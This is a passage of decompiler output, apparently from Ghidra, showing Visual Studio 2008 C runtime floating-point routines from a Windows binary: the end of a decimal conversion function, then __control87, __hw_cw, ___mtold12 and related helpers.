           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            uVar16 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            uVar16 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)(uVar16 >> 0x10);
        uStack_12 = (ushort)uVar16;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          uStack_20 = local_10._2_2_;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar20;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          uVar16 = 0;
          iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
          param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        }
        goto LAB_00420fd3;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    uStack_1e = 0;
    uStack_20 = 0;
    uStack_1c = (ushort)iVar21;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack_19 = (byte)((uint)iVar21 >> 0x18);
    param_2 = 0;
    uVar16 = 0;
  }
LAB_00420fd3:
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    uVar14 = uVar16;
    do {
      uVar16 = uVar14 << 1;
      iVar4 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar4 | (ushort)(uVar14 >> 0x1f);
      iVar5 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar5 | uStack_1e >> 0xf;
      local_48 = local_48 + -1;
      uStack_1e = (ushort)((uint)iVar4 >> 0x10);
      local_1a = (undefined)((uint)iVar5 >> 0x10);
      bStack_19 = (byte)((uint)iVar5 >> 0x18);
      uVar14 = uVar16;
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar22 = -iVar21 & 0xff, uVar22 != 0)) {
      do {
        iVar4 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar23 = CONCAT22(uStack_1e,uStack_20);
        iVar21 = CONCAT22(uStack_1e,uStack_20);
        uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar16;
        local_1a = (undefined)(uVar16 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
        uVar16 = uVar14 >> 1 | iVar21 << 0x1f;
        uVar22 = uVar22 - 1;
        uStack_20 = (ushort)(uVar23 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
        local_24._2_2_ = (ushort)(uVar16 >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
      } while (0 < (int)uVar22);
    }
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar20 = uStack_1e;
    for (iVar21 = param_4 + 1; 0 < iVar21; iVar21 = iVar21 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar2 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = (undefined *)CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar22 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar6 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar6 = true;
        }
        if (bVar6) {
          uVar22 = uVar22 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar22 = uVar22 + 1;
      }
      iVar4 = (int)(local_38 + uVar22) * 2;
      uStack_1c = (ushort)iVar4 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar4 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      uStack_1e = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = uStack_1e;
    }
    psVar18 = psVar17 + -1;
    uStack_1e = uVar20;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((uVar10 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_0042119b;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar15 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
    *(undefined *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar10 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_0042119b:
  uStack_3e = iVar2;
  local_24 = uVar16;
  local_10 = param_2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2008 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2008 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2008 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_0042d778 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2008 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    do {
      uVar2 = *param_3;
      uVar10 = *param_3;
      uVar1 = param_3[1];
      uVar11 = param_3[2];
      uVar9 = param_3[1] * 2;
      bVar4 = false;
      uVar8 = (param_3[2] * 2 | param_3[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_3 = uVar3;
      param_3[1] = uVar9;
      param_3[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_3 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_3[1] = uVar10;
        if (bVar5) {
          param_3[2] = uVar8 + 1;
        }
      }
      uVar10 = param_3[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_3[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
      param_3[1] = uVar10;
      if (bVar4) {
        param_3[2] = param_3[2] + 1;
      }
      param_3[2] = param_3[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_3[2] * 2 | uVar10 >> 0x1f;
      *param_3 = uVar1;
      param_3[1] = uVar11;
      param_3[2] = uVar10;
      uVar2 = uVar1 + (int)*param_1;
      if ((uVar2 < uVar1) || (uVar2 < (uint)(int)*param_1)) {
        bVar4 = true;
      }
      *param_3 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        bVar4 = false;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          bVar4 = true;
        }
        param_3[1] = uVar2;
        if (bVar4) {
          param_3[2] = uVar10 + 1;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
  }
  while (param_3[2] == 0) {
    param_3[2] = param_3[1] >> 0x10;
    sVar6 = sVar6 + -0x10;
    param_3[1] = param_3[1] << 0x10 | *param_3 >> 0x10;
    *param_3 = *param_3 << 0x10;
  }
  uVar2 = param_3[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_3;
    uVar1 = param_3[1];
    sVar6 = sVar6 + -1;
    *param_3 = uVar10 * 2;
    uVar2 = param_3[2] * 2;
    param_3[1] = uVar1 * 2 | uVar10 >> 0x1f;
    param_3[2] = uVar2 | uVar1 >> 0x1f;
  }
  *(short *)((int)param_3 + 10) = sVar6;
  ___security_check_cookie_4(uVar7 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2008 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_0042d778 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_0042b9a4 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}


